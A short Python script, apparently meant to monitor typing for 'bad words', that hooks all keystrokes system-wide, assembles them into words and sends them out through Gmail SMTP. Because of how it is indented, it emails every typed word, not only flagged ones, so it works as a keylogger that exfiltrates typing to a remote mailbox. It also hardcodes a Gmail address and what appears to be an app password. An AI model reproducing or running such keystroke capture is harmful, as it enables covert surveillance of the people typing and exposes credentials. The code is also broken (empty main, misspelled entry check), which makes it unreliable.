import keyboard
import smtplib

bad_words = ["bad", "hate", "stupid", "abuse"]

word = ""
def send_email(word):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("jadhavkusum2806@gmail.com", "csoaxnejudbbvklg")

    message = "Bad word detected: " + word

    server.sendmail("jadhavkusum2806@gmail.com",
                    "jadhavkusum2806@gmail.com",
                    message)

    server.quit()

    print("Mail sent")



def main():
 global word

print("Program running... Press Ctrl+C to stop")

while True:
    event = keyboard.read_event()

    if event.event_type == keyboard.KEY_DOWN:
        key = event.name

        if len(key) == 1 and key.isalpha():
            word += key

        elif key == "space":
            if word in bad_words:
                file = open("mkl.txt", "a")
                file.write("Bad word pressed: " + word + "\n")
                file.close()
            

            send_email(word)

            word = ""
if __name__=="_main__":
    main()